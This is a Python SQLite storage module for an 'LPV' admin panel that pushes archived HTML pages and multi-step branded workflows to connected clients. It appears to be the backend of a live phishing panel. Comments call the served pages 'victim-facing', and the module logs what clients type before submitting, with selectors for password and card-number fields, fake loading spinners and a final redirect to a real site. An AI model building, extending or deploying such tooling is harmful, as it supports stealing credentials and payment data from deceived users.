"""
LPV (Live Panel Version) storage layer.

Three tables, three jobs:

    lpv_pages
        Archive of HTML pages an admin can push to a client. Stored on
        disk under config.LPV_PAGES_DIR; the DB row points at the file
        and keeps display metadata (name, description, tags, version).

    lpv_sessions
        One row per (client_id, session_started_at). Tracks the *active*
        LPV session for a client so we can show "current page" in the
        admin panel and resume after reconnects.

    lpv_audit
        Append-only event log: page pushes, user events captured by the
        client runtime, admin actions. Indexed by (client_id, timestamp)
        so the admin panel can stream recent events cheaply.

We use SQLite (stdlib) with WAL journaling so writes from the API
process and reads from the admin UI do not block each other.
"""

from __future__ import annotations

import json
import os
import re
import sqlite3
import threading
import time
import uuid
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional

from config import LPV_DB_PATH, LPV_PAGES_DIR


# ---------------------------------------------------------------------------
# Connection management
# ---------------------------------------------------------------------------

_lock = threading.Lock()
_initialized = False


def _connect() -> sqlite3.Connection:
    conn = sqlite3.connect(
        LPV_DB_PATH,
        detect_types=sqlite3.PARSE_DECLTYPES,
        isolation_level=None,  # autocommit; we use explicit BEGIN
        check_same_thread=False,
    )
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn


@contextmanager
def get_conn():
    """Thread-safe connection context. One shared connection, serialized
    via a module-level lock — fine for an admin-driven workload. If you
    ever push hundreds of writes/sec through this, switch to a pool."""
    global _initialized
    with _lock:
        if not _initialized:
            init_db()
            _initialized = True
        conn = _connect()
        try:
            yield conn
        finally:
            conn.close()


def init_db() -> None:
    LPV_PAGES_DIR.mkdir(parents=True, exist_ok=True)
    with _connect() as conn:
        conn.executescript(
            """
            CREATE TABLE IF NOT EXISTS lpv_pages (
                id            TEXT PRIMARY KEY,
                name          TEXT NOT NULL,
                description   TEXT NOT NULL DEFAULT '',
                tags          TEXT NOT NULL DEFAULT '[]',   -- JSON array
                file_path     TEXT NOT NULL,
                size_bytes    INTEGER NOT NULL DEFAULT 0,
                version       INTEGER NOT NULL DEFAULT 1,
                created_at    REAL NOT NULL,
                updated_at    REAL NOT NULL
            );

            CREATE INDEX IF NOT EXISTS idx_lpv_pages_name
                ON lpv_pages(name COLLATE NOCASE);
            CREATE INDEX IF NOT EXISTS idx_lpv_pages_updated
                ON lpv_pages(updated_at DESC);

            -- Version history. Every save_page() on an existing page
            -- snapshots the *previous* HTML here before overwriting the
            -- live file, so admins can diff or roll back without git.
            CREATE TABLE IF NOT EXISTS lpv_page_versions (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                page_id     TEXT NOT NULL,
                version     INTEGER NOT NULL,
                name        TEXT NOT NULL,
                description TEXT NOT NULL DEFAULT '',
                tags        TEXT NOT NULL DEFAULT '[]',
                file_path   TEXT NOT NULL,
                size_bytes  INTEGER NOT NULL,
                created_at  REAL NOT NULL,
                UNIQUE(page_id, version)
            );
            CREATE INDEX IF NOT EXISTS idx_lpv_versions_page
                ON lpv_page_versions(page_id, version DESC);

            CREATE TABLE IF NOT EXISTS lpv_sessions (
                client_id            TEXT PRIMARY KEY,
                current_page_id      TEXT,
                current_page_name    TEXT,
                lpv_active           INTEGER NOT NULL DEFAULT 0,
                started_at           REAL NOT NULL,
                last_event_at        REAL,
                FOREIGN KEY (current_page_id) REFERENCES lpv_pages(id) ON DELETE SET NULL
            );

            CREATE TABLE IF NOT EXISTS lpv_audit (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id    TEXT NOT NULL,
                event_type   TEXT NOT NULL,    -- e.g. 'page_pushed', 'field_change', 'click', 'page_loaded'
                page_id      TEXT,
                page_name    TEXT,
                payload      TEXT NOT NULL DEFAULT '{}',  -- JSON
                timestamp    REAL NOT NULL
            );

            CREATE INDEX IF NOT EXISTS idx_lpv_audit_client_time
                ON lpv_audit(client_id, timestamp DESC);

            -- Per-client redaction rules. When lpv_event arrives we
            -- look up the matching client_id and replace any value in
            -- a sensitive field with a mask. The raw value never leaves
            -- the client runtime in those cases.
            CREATE TABLE IF NOT EXISTS lpv_redaction (
                client_id    TEXT NOT NULL,
                selector     TEXT NOT NULL,         -- e.g. 'name=pwd' or 'type=password' or '.cc-number'
                field        TEXT NOT NULL,         -- 'name' | 'type' | 'id' | 'placeholder' | 'label' | 'class'
                action       TEXT NOT NULL DEFAULT 'mask',  -- 'mask' | 'hide' (drop the field entirely)
                created_at   REAL NOT NULL,
                PRIMARY KEY (client_id, selector, field)
            );

            -- Workflow: an ordered sequence of pages to push as one
            -- "Push Workflow" action. Each step can be a single page
            -- (push_page) or a wait (sleep_seconds). The admin panel
            -- renders this as a vertical stepper.
            CREATE TABLE IF NOT EXISTS lpv_workflows (
                id            TEXT PRIMARY KEY,
                name          TEXT NOT NULL,
                description   TEXT NOT NULL DEFAULT '',
                steps         TEXT NOT NULL DEFAULT '[]',   -- JSON array of {kind, page_id, sleep_seconds}
                created_at    REAL NOT NULL,
                updated_at    REAL NOT NULL
            );
            """
        )
        # ---- workflow branding + optional redirect-respect (added later) ----
        # Older DBs lack these columns; add them idempotently.
        try:
            existing_cols = {
                r[1] for r in conn.execute("PRAGMA table_info(lpv_workflows)").fetchall()
            }
            for col, decl in (
                ("brand_logo_url",   "brand_logo_url TEXT NOT NULL DEFAULT ''"),
                ("brand_color",      "brand_color TEXT NOT NULL DEFAULT ''"),
                ("respect_redirect", "respect_redirect INTEGER NOT NULL DEFAULT 1"),
            ):
                if col not in existing_cols:
                    conn.execute(f"ALTER TABLE lpv_workflows ADD COLUMN {decl}")
        except Exception:
            pass

        # ---- page bindings (added later): per-page find->replace rules ----
        # Admin-defined substitutions applied when the page is SERVED to a
        # client (victim-facing), e.g. rewrite every "me.com" to "you.com".
        # Stored as a JSON array of {"find": str, "replace": str}.
        try:
            page_cols = {
                r[1] for r in conn.execute("PRAGMA table_info(lpv_pages)").fetchall()
            }
            if "bindings" not in page_cols:
                conn.execute(
                    "ALTER TABLE lpv_pages ADD COLUMN bindings TEXT NOT NULL DEFAULT '[]'"
                )
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Archive (pages)
# ---------------------------------------------------------------------------

def save_page(
    name: str,
    html: str,
    description: str = "",
    tags: Optional[Iterable[str]] = None,
    page_id: Optional[str] = None,
) -> Dict[str, Any]:
    """Insert or update an archived HTML page. The raw HTML is written
    to disk; the DB row stores metadata + file path so queries stay
    fast and we never bloat sqlite with multi-MB blobs.

    On update, the *previous* version of the page is snapshotted into
    `lpv_page_versions` so the admin can view or roll back later."""
    name = (name or "").strip()
    if not name:
        raise ValueError("page name is required")
    if not name.lower().endswith((".html", ".htm")):
        name = name + ".html"

    tags_list = list(tags or [])
    now = time.time()
    pid = page_id or uuid.uuid4().hex
    safe_filename = f"{pid}.html"
    file_path = LPV_PAGES_DIR / safe_filename

    with get_conn() as conn:
        # Detect existing row by name (case-insensitive) so re-uploading
        # the same name updates instead of duplicating.
        existing = conn.execute(
            "SELECT * FROM lpv_pages WHERE name = ? COLLATE NOCASE",
            (name,),
        ).fetchone()
        if existing:
            pid = existing["id"]
            prev_version = existing["version"]
            new_version = prev_version + 1
            new_file_path = LPV_PAGES_DIR / f"{pid}.html"
            prev_file_path = Path(existing["file_path"])
            prev_html = ""
            if prev_file_path.exists():
                try:
                    prev_html = prev_file_path.read_text(encoding="utf-8", errors="replace")
                except Exception:
                    prev_html = ""

            # Snapshot the previous version BEFORE we overwrite the file.
            # Each version gets its own file so even the live page can be
            # moved around without breaking the history.
            version_file = LPV_PAGES_DIR / f"{pid}.v{prev_version}.html"
            try:
                version_file.write_text(prev_html, encoding="utf-8")
            except Exception:
                version_file = prev_file_path  # fall back to live file

            conn.execute(
                """
                INSERT OR REPLACE INTO lpv_page_versions
                (page_id, version, name, description, tags, file_path, size_bytes, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    pid,
                    prev_version,
                    existing["name"],
                    existing["description"],
                    existing["tags"],
                    str(version_file),
                    existing["size_bytes"],
                    now,
                ),
            )

            # Now write the new content to the live file.
            new_file_path.write_text(html, encoding="utf-8")
            conn.execute(
                """
                UPDATE lpv_pages
                SET description = ?, tags = ?, file_path = ?, size_bytes = ?,
                    version = ?, updated_at = ?
                WHERE id = ?
                """,
                (
                    description,
                    json.dumps(tags_list),
                    str(new_file_path),
                    len(html.encode("utf-8")),
                    new_version,
                    now,
                    pid,
                ),
            )
        else:
            file_path.write_text(html, encoding="utf-8")
            conn.execute(
                """
                INSERT INTO lpv_pages
                (id, name, description, tags, file_path, size_bytes, version, created_at, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?)
                """,
                (
                    pid,
                    name,
                    description,
                    json.dumps(tags_list),
                    str(file_path),
                    len(html.encode("utf-8")),
                    now,
                    now,
                ),
            )

    return get_page(pid) or {}


def rename_page(page_id: str, new_name: str) -> Optional[Dict[str, Any]]:
    """Rename a page. Keeps the same id and version history; only the
    `name` column changes. Fails (returns None) if the new name is
    empty or collides with another page."""
    new_name = (new_name or "").strip()
    if not new_name:
        raise ValueError("new name is required")
    if not new_name.lower().endswith((".html", ".htm")):
        new_name = new_name + ".html"
    with get_conn() as conn:
        collision = conn.execute(
            "SELECT id FROM lpv_pages WHERE name = ? COLLATE NOCASE AND id != ?",
            (new_name, page_id),
        ).fetchone()
        if collision:
            raise ValueError(f"a page named {new_name!r} already exists")
        conn.execute(
            "UPDATE lpv_pages SET name = ?, updated_at = ? WHERE id = ?",
            (new_name, time.time(), page_id),
        )
    return get_page(page_id)


def duplicate_page(page_id: str, new_name: Optional[str] = None) -> Optional[Dict[str, Any]]:
    """Deep-copy a page: new id, new file, fresh version=1, same HTML.
    If new_name is None we suffix ' (copy)'. The new page starts a
    fresh version history."""
    src = get_page(page_id)
    if not src:
        return None
    target_name = (new_name or (src["name"].rsplit(".", 1)[0] + " (copy).html")).strip()
    html = read_page_html(page_id) or ""
    return save_page(
        name=target_name,
        html=html,
        description=src.get("description", ""),
        tags=src.get("tags", []),
    )


def list_versions(page_id: str) -> List[Dict[str, Any]]:
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM lpv_page_versions WHERE page_id = ? ORDER BY version DESC",
            (page_id,),
        ).fetchall()
    return [
        {
            "id": r["id"],
            "page_id": r["page_id"],
            "version": r["version"],
            "name": r["name"],
            "description": r["description"],
            "tags": json.loads(r["tags"] or "[]"),
            "file_path": r["file_path"],
            "size_bytes": r["size_bytes"],
            "created_at": r["created_at"],
        }
        for r in rows
    ]


def get_version(page_id: str, version: int) -> Optional[Dict[str, Any]]:
    with get_conn() as conn:
        r = conn.execute(
            "SELECT * FROM lpv_page_versions WHERE page_id = ? AND version = ?",
            (page_id, version),
        ).fetchone()
    if not r:
        return None
    return {
        "id": r["id"],
        "page_id": r["page_id"],
        "version": r["version"],
        "name": r["name"],
        "description": r["description"],
        "tags": json.loads(r["tags"] or "[]"),
        "file_path": r["file_path"],
        "size_bytes": r["size_bytes"],
        "created_at": r["created_at"],
    }


def read_version_html(page_id: str, version: int) -> Optional[str]:
    v = get_version(page_id, version)
    if not v:
        return None
    p = Path(v["file_path"])
    if not p.exists():
        return None
    return p.read_text(encoding="utf-8", errors="replace")


def restore_version(page_id: str, version: int) -> Optional[Dict[str, Any]]:
    """Roll the live page back to a previous version. Snapshots the
    *current* live state into history first so the restore is itself
    reversible."""
    html = read_version_html(page_id, version)
    if html is None:
        return None
    current = get_page(page_id)
    if not current:
        return None
    # Round-tripping through save_page() correctly snapshots the
    # current state as a new history entry and bumps the version.
    return save_page(
        name=current["name"],
        html=html,
        description=current.get("description", ""),
        tags=current.get("tags", []),
        page_id=page_id,
    )


def list_pages(query: str = "", limit: int = 200) -> List[Dict[str, Any]]:
    with get_conn() as conn:
        if query:
            like = f"%{query}%"
            rows = conn.execute(
                """
                SELECT * FROM lpv_pages
                WHERE name LIKE ? COLLATE NOCASE
                   OR description LIKE ? COLLATE NOCASE
                   OR tags LIKE ? COLLATE NOCASE
                ORDER BY updated_at DESC
                LIMIT ?
                """,
                (like, like, like, limit),
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM lpv_pages ORDER BY updated_at DESC LIMIT ?",
                (limit,),
            ).fetchall()
    return [_row_to_page(r) for r in rows]


def get_page(page_id: str) -> Optional[Dict[str, Any]]:
    with get_conn() as conn:
        row = conn.execute(
            "SELECT * FROM lpv_pages WHERE id = ?", (page_id,)
        ).fetchone()
    return _row_to_page(row) if row else None


def read_page_html(page_id: str) -> Optional[str]:
    page = get_page(page_id)
    if not page:
        return None
    path = Path(page["file_path"])
    if not path.exists():
        return None
    return path.read_text(encoding="utf-8", errors="replace")


def delete_page(page_id: str) -> bool:
    page = get_page(page_id)
    if not page:
        return False
    with get_conn() as conn:
        conn.execute("DELETE FROM lpv_pages WHERE id = ?", (page_id,))
    try:
        Path(page["file_path"]).unlink(missing_ok=True)
    except Exception:
        pass
    return True


def _row_to_page(row: sqlite3.Row) -> Dict[str, Any]:
    try:
        tags = json.loads(row["tags"] or "[]")
    except Exception:
        tags = []
    bindings: List[Dict[str, str]] = []
    try:
        raw_b = json.loads(row["bindings"] or "[]")
        if isinstance(raw_b, list):
            bindings = [
                {"find": str(b.get("find") or ""), "replace": str(b.get("replace") or "")}
                for b in raw_b
                if isinstance(b, dict) and str(b.get("find") or "")
            ]
    except Exception:
        bindings = []
    return {
        "id": row["id"],
        "name": row["name"],
        "description": row["description"],
        "tags": tags,
        "file_path": row["file_path"],
        "size_bytes": row["size_bytes"],
        "version": row["version"],
        "created_at": row["created_at"],
        "updated_at": row["updated_at"],
        "bindings": bindings,
    }


def set_page_bindings(page_id: str, bindings: Any) -> bool:
    """Replace a page's binding list (find -> replace substitutions applied
    when the page HTML is served to clients).  Validates and normalizes the
    input; caps at 50 rules / 2000 chars per side."""
    rules: List[Dict[str, str]] = []
    if isinstance(bindings, list):
        for b in bindings[:50]:
            if not isinstance(b, dict):
                continue
            find = str(b.get("find") or "")[:2000]
            repl = str(b.get("replace") or "")[:2000]
            if find:
                rules.append({"find": find, "replace": repl})
    with get_conn() as conn:
        cur = conn.execute(
            "UPDATE lpv_pages SET bindings = ?, updated_at = ? WHERE id = ?",
            (json.dumps(rules), time.time(), page_id),
        )
    return cur.rowcount > 0


# ---------------------------------------------------------------------------
# Sessions (current page per client)
# ---------------------------------------------------------------------------

def start_session(client_id: str) -> None:
    now = time.time()
    with get_conn() as conn:
        conn.execute(
            """
            INSERT INTO lpv_sessions (client_id, lpv_active, started_at, last_event_at)
            VALUES (?, 1, ?, ?)
            ON CONFLICT(client_id) DO UPDATE SET
                lpv_active = 1,
                started_at = excluded.started_at,
                last_event_at = excluded.last_event_at
            """,
            (client_id, now, now),
        )


def stop_session(client_id: str) -> None:
    with get_conn() as conn:
        conn.execute(
            "UPDATE lpv_sessions SET lpv_active = 0 WHERE client_id = ?",
            (client_id,),
        )


def get_session(client_id: str) -> Optional[Dict[str, Any]]:
    with get_conn() as conn:
        row = conn.execute(
            "SELECT * FROM lpv_sessions WHERE client_id = ?", (client_id,)
        ).fetchone()
    if not row:
        return None
    return {
        "client_id": row["client_id"],
        "current_page_id": row["current_page_id"],
        "current_page_name": row["current_page_name"],
        "lpv_active": bool(row["lpv_active"]),
        "started_at": row["started_at"],
        "last_event_at": row["last_event_at"],
    }


def set_current_page(client_id: str, page_id: Optional[str], page_name: Optional[str]) -> None:
    now = time.time()
    with get_conn() as conn:
        # Make sure a session row exists so the FK target is valid.
        conn.execute(
            """
            INSERT INTO lpv_sessions (client_id, lpv_active, started_at, last_event_at)
            VALUES (?, 1, ?, ?)
            ON CONFLICT(client_id) DO NOTHING
            """,
            (client_id, now, now),
        )
        conn.execute(
            """
            UPDATE lpv_sessions
            SET current_page_id = ?, current_page_name = ?, last_event_at = ?
            WHERE client_id = ?
            """,
            (page_id, page_name, now, client_id),
        )


# ---------------------------------------------------------------------------
# Audit log
# ---------------------------------------------------------------------------

def record_event(
    client_id: str,
    event_type: str,
    payload: Optional[Dict[str, Any]] = None,
    page_id: Optional[str] = None,
    page_name: Optional[str] = None,
) -> int:
    now = time.time()
    with get_conn() as conn:
        cur = conn.execute(
            """
            INSERT INTO lpv_audit (client_id, event_type, page_id, page_name, payload, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (
                client_id,
                event_type,
                page_id,
                page_name,
                json.dumps(payload or {}, default=str),
                now,
            ),
        )
        # Touch the session row so 'last_event_at' stays fresh.
        conn.execute(
            "UPDATE lpv_sessions SET last_event_at = ? WHERE client_id = ?",
            (now, client_id),
        )
        return cur.lastrowid


def list_events(client_id: str, limit: int = 200, since: Optional[float] = None) -> List[Dict[str, Any]]:
    with get_conn() as conn:
        if since is not None:
            rows = conn.execute(
                """
                SELECT * FROM lpv_audit
                WHERE client_id = ? AND timestamp > ?
                ORDER BY timestamp DESC
                LIMIT ?
                """,
                (client_id, since, limit),
            ).fetchall()
        else:
            rows = conn.execute(
                """
                SELECT * FROM lpv_audit
                WHERE client_id = ?
                ORDER BY timestamp DESC
                LIMIT ?
                """,
                (client_id, limit),
            ).fetchall()
    return [_row_to_event(r) for r in rows]


def list_profiles(limit: int = 500) -> List[Dict[str, Any]]:
    """Return one row per client_id that has audit history.

    Each row carries the per-client aggregate the Profiles sub-tab needs:
    total event count, distinct pages seen, first/last event timestamps,
    and a sample of the most recent event types so the operator can spot
    a session at a glance.

    Active sessions (rows in ``lpv_sessions``) are joined in to expose
    the current page when the client is live.
    """
    with get_conn() as conn:
        rows = conn.execute(
            """
            SELECT
                a.client_id                                              AS client_id,
                COUNT(*)                                                 AS event_count,
                COUNT(DISTINCT COALESCE(a.page_id, ''))                 AS page_count,
                MIN(a.timestamp)                                         AS first_seen,
                MAX(a.timestamp)                                         AS last_seen,
                -- JSON array of the most recent 5 event types, newest first.
                (
                    SELECT json_group_array(e.event_type)
                    FROM (
                        SELECT event_type
                        FROM lpv_audit
                        WHERE client_id = a.client_id
                        ORDER BY timestamp DESC
                        LIMIT 5
                    ) e
                )                                                       AS recent_event_types,
                -- Most recent page this client was on (name, then id).
                (
                    SELECT page_name FROM lpv_audit
                    WHERE client_id = a.client_id AND page_name IS NOT NULL
                    ORDER BY timestamp DESC LIMIT 1
                )                                                       AS last_page_name,
                (
                    SELECT page_id FROM lpv_audit
                    WHERE client_id = a.client_id AND page_id IS NOT NULL
                    ORDER BY timestamp DESC LIMIT 1
                )                                                       AS last_page_id,
                -- Count of field_final events (the "what they actually
                -- typed before submitting" log).  Useful stat for the
                -- card: a client with hundreds of field_final events
                -- is clearly filling stuff in.
                (
                    SELECT COUNT(*) FROM lpv_audit
                    WHERE client_id = a.client_id
                      AND event_type = 'field_final'
                )                                                       AS field_final_count
            FROM lpv_audit a
            GROUP BY a.client_id
            ORDER BY last_seen DESC
            LIMIT ?
            """,
            (limit,),
        ).fetchall()

        # Left-join to lpv_sessions for the "currently active" flag.
        session_rows = conn.execute(
            "SELECT client_id, current_page_id, current_page_name, "
            "started_at, last_event_at FROM lpv_sessions"
        ).fetchall()
    sessions_by_id = {r["client_id"]: _row_to_session(r) for r in session_rows}

    out: List[Dict[str, Any]] = []
    for r in rows:
        cid = r["client_id"]
        recent = []
        try:
            parsed = json.loads(r["recent_event_types"] or "[]")
            if isinstance(parsed, list):
                recent = [str(x) for x in parsed]
        except Exception:
            recent = []
        sess = sessions_by_id.get(cid) or {}
        out.append({
            "client_id":            cid,
            "event_count":          int(r["event_count"] or 0),
            "page_count":           int(r["page_count"] or 0),
            "first_seen":           float(r["first_seen"] or 0.0),
            "last_seen":            float(r["last_seen"] or 0.0),
            "recent_event_types":   recent,
            "last_page_name":       r["last_page_name"] or "",
            "last_page_id":         r["last_page_id"] or "",
            "field_final_count":    int(r["field_final_count"] or 0),
            "is_active":            bool(sess),
            "current_page_id":      sess.get("current_page_id", ""),
            "current_page_name":    sess.get("current_page_name", ""),
            "session_started_at":   sess.get("session_started_at", 0.0),
        })
    return out


def _row_to_event(row: sqlite3.Row) -> Dict[str, Any]:
    try:
        payload = json.loads(row["payload"] or "{}")
    except Exception:
        payload = {}
    return {
        "id": row["id"],
        "client_id": row["client_id"],
        "event_type": row["event_type"],
        "page_id": row["page_id"],
        "page_name": row["page_name"],
        "payload": payload,
        "timestamp": row["timestamp"],
    }


def _row_to_session(row: sqlite3.Row) -> Dict[str, Any]:
    return {
        "client_id":          row["client_id"],
        "current_page_id":    row["current_page_id"] or "",
        "current_page_name":  row["current_page_name"] or "",
        "session_started_at": float(row["started_at"] or 0.0),
        "last_event_at":      float(row["last_event_at"] or 0.0),
    }


# ---------------------------------------------------------------------------
# Redaction rules (per-client field masking)
# ---------------------------------------------------------------------------

def set_redaction(client_id: str, selector: str, field: str, action: str = "mask") -> None:
    """Add or replace a redaction rule for a client. `field` is which
    HTML attribute the selector matches against — name, type, id,
    placeholder, label, or class. `action` is 'mask' (replace value
    with bullets) or 'hide' (drop the field from the event entirely).
    """
    if action not in ("mask", "hide"):
        raise ValueError("action must be 'mask' or 'hide'")
    if field not in ("name", "type", "id", "placeholder", "label", "class"):
        raise ValueError(f"unknown field {field!r}")
    with get_conn() as conn:
        conn.execute(
            """
            INSERT INTO lpv_redaction (client_id, selector, field, action, created_at)
            VALUES (?, ?, ?, ?, ?)
            ON CONFLICT(client_id, selector, field) DO UPDATE SET
                action = excluded.action
            """,
            (client_id, selector, field, action, time.time()),
        )


def delete_redaction(client_id: str, selector: str, field: str) -> None:
    with get_conn() as conn:
        conn.execute(
            "DELETE FROM lpv_redaction WHERE client_id = ? AND selector = ? AND field = ?",
            (client_id, selector, field),
        )


def list_redaction(client_id: str) -> List[Dict[str, Any]]:
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM lpv_redaction WHERE client_id = ? ORDER BY created_at DESC",
            (client_id,),
        ).fetchall()
    return [
        {
            "client_id": r["client_id"],
            "selector": r["selector"],
            "field": r["field"],
            "action": r["action"],
            "created_at": r["created_at"],
        }
        for r in rows
    ]


# ---------------------------------------------------------------------------
# Workflows (ordered page chains)
# ---------------------------------------------------------------------------

def save_workflow(workflow_id: Optional[str], name: str, description: str, steps: List[Dict[str, Any]],
                  brand_logo_url: Optional[str] = None,
                  brand_color: Optional[str] = None,
                  respect_redirect: Optional[bool] = None) -> Dict[str, Any]:
    """Create or update a workflow. `steps` is a list of dicts:
       {kind: 'page',      page_id: '...', page_name: '...'}
       {kind: 'redirect',  wait_seconds: 4}  — redirect spinner now has NO timeout (waits forever for lpv_spinner or disconnect)
       {kind: 'goto',      url: 'http://www.google.com'} — real page navigation
       {kind: 'wait',      sleep_seconds: 2}

    Branding/behavior kwargs (per-workflow "LPV loading screen"):
       brand_logo_url   custom logo shown on the branded loading screen;
                        '' clears it, None keeps the previous value.
       brand_color      hex, rgb(), or rgba() spinner color ('' = default/inherit,
                        None = keep).
       respect_redirect False -> redirect steps just sleep wait_seconds and
                        continue instead of waiting forever for the client's
                        spinner click ("redirect logic is optional").
    """
    name = (name or "").strip()
    if not name:
        raise ValueError("workflow name is required")
    # ---- validate branding/behavior fields ----
    if brand_logo_url is not None:
        brand_logo_url = (brand_logo_url or "").strip()
        if brand_logo_url and not brand_logo_url.lower().startswith(("http://", "https://")):
            raise ValueError("brand logo URL must start with http:// or https://")
        if len(brand_logo_url) > 2048:
            raise ValueError("brand logo URL too long")
    if brand_color is not None:
        brand_color = (brand_color or "").strip()
        # Admin normally emits a hex value, but keep API-created workflows
        # compatible with CSS rgb()/rgba() palette values as well. The client
        # normalizes all three forms before applying them to the spinner/LPV.
        _hex_color = r"#[0-9a-fA-F]{3,4}|#[0-9a-fA-F]{6}|#[0-9a-fA-F]{8}"
        _rgb_color = (
            r"rgba?\(\s*[0-9]{1,3}\s*,\s*[0-9]{1,3}\s*,\s*[0-9]{1,3}"
            r"(?:\s*,\s*(?:0|1|0?\.[0-9]+))?\s*\)"
        )
        if brand_color and not re.fullmatch(
                rf"(?:{_hex_color}|{_rgb_color})", brand_color, flags=re.IGNORECASE):
            raise ValueError(
                "brand color must be a hex, rgb(), or rgba() CSS color "
                "(or empty for default)"
            )
    if respect_redirect is not None:
        respect_redirect = bool(respect_redirect)
    # Validate steps
    norm_steps = []
    for s in steps or []:
        kind = s.get("kind")
        # normalize goto aliases: 'go to', 'navigate', 'goto'
        if kind in ("go to", "navigate"):
            kind = "goto"
        if kind == "page":
            if not s.get("page_id"):
                continue
            step_out = {
                "kind": kind,
                "page_id": s["page_id"],
                "page_name": s.get("page_name", ""),
            }
            norm_steps.append(step_out)
        elif kind == "goto":
            raw_url = (s.get("url") or s.get("page_url") or s.get("href") or "").strip()
            if not raw_url:
                raise ValueError("goto step requires a url")
            # Validate URL shape — allow domain without scheme, but must look URL-ish
            # Minimal validation: contains '.' or ':' and no spaces, length 3..2048
            if " " in raw_url or len(raw_url) < 3 or len(raw_url) > 2048:
                raise ValueError(f"invalid goto url {raw_url!r}")
            # Prepend https if no scheme
            url = raw_url
            if not url.lower().startswith(("http://", "https://")):
                url = "https://" + url
            # Further validation: must parse as http(s) URL with netloc
            try:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                if not parsed.netloc or "." not in parsed.netloc:
                    raise ValueError()
            except Exception:
                raise ValueError(f"invalid goto url {raw_url!r}")
            norm_steps.append({"kind": "goto", "url": url})
        elif kind == "redirect":
            # REDIRECT = LVP spinner body — not a page. It waits FOREVER for the
            # client's overlay spinner (triggered by submit/button click)
            # then sleeps wait_seconds before next page. No timeout.
            wait_secs = max(0, min(60, int(s.get("wait_seconds", 0) or 0)))
            step_out: Dict[str, Any] = {
                "kind": "redirect",
                "wait_seconds": wait_secs,
            }
            # Preserve explicit flag if caller disabled spinner wait.
            if "wait_for_spinner" in s:
                step_out["wait_for_spinner"] = bool(s["wait_for_spinner"])
            # Backward compat: ignore wait_for_spinner_timeout if sent by old UI — no longer used
            # but preserve legacy old field silently for forward compat (not honored at run)
            # Backward compat: old redirect steps had a page_id — keep it for display but ignored at execution.
            if s.get("page_id"):
                step_out["page_id"] = s["page_id"]
                step_out["page_name"] = s.get("page_name", "")
            norm_steps.append(step_out)
        elif kind == "wait":
            secs = max(0, min(60, int(s.get("sleep_seconds", 1) or 0)))
            norm_steps.append({"kind": "wait", "sleep_seconds": secs})
    wid = workflow_id or uuid.uuid4().hex
    now = time.time()
    with get_conn() as conn:
        existing = conn.execute(
            "SELECT * FROM lpv_workflows WHERE id = ?", (wid,)
        ).fetchone()
        if existing:
            # None means "caller didn't send it — keep the previous value"
            def _prev(key, default):
                try:
                    v = existing[key]
                    return default if v is None else v
                except Exception:
                    return default
            _logo = _prev("brand_logo_url", "") if brand_logo_url is None else brand_logo_url
            _color = _prev("brand_color", "") if brand_color is None else brand_color
            _respect = _prev("respect_redirect", 1) if respect_redirect is None else (1 if respect_redirect else 0)
            conn.execute(
                """
                UPDATE lpv_workflows
                SET name = ?, description = ?, steps = ?, brand_logo_url = ?,
                    brand_color = ?, respect_redirect = ?, updated_at = ?
                WHERE id = ?
                """,
                (name, description, json.dumps(norm_steps), _logo or "", _color or "", int(_respect or 0), now, wid),
            )
        else:
            _logo = brand_logo_url or ""
            _color = brand_color or ""
            _respect = 1 if respect_redirect is None else (1 if respect_redirect else 0)
            conn.execute(
                """
                INSERT INTO lpv_workflows (id, name, description, steps,
                                           brand_logo_url, brand_color, respect_redirect,
                                           created_at, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (wid, name, description, json.dumps(norm_steps), _logo, _color, _respect, now, now),
            )
    return get_workflow(wid) or {}


def list_workflows() -> List[Dict[str, Any]]:
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM lpv_workflows ORDER BY updated_at DESC"
        ).fetchall()
    return [_row_to_workflow(r) for r in rows]


def get_workflow(workflow_id: str) -> Optional[Dict[str, Any]]:
    with get_conn() as conn:
        r = conn.execute(
            "SELECT * FROM lpv_workflows WHERE id = ?", (workflow_id,)
        ).fetchone()
    return _row_to_workflow(r) if r else None


def delete_workflow(workflow_id: str) -> bool:
    with get_conn() as conn:
        cur = conn.execute("DELETE FROM lpv_workflows WHERE id = ?", (workflow_id,))
        return cur.rowcount > 0


def _row_to_workflow(row: sqlite3.Row) -> Dict[str, Any]:
    try:
        steps = json.loads(row["steps"] or "[]")
    except Exception:
        steps = []

    def _col(key, default):
        # Columns added via migration may be absent on very old rows/DBs.
        try:
            v = row[key]
            return default if v is None else v
        except Exception:
            return default

    return {
        "id": row["id"],
        "name": row["name"],
        "description": row["description"],
        "steps": steps,
        "brand_logo_url": _col("brand_logo_url", "") or "",
        "brand_color": _col("brand_color", "") or "",
        "respect_redirect": bool(_col("respect_redirect", 1)),
        "created_at": row["created_at"],
        "updated_at": row["updated_at"],
    }
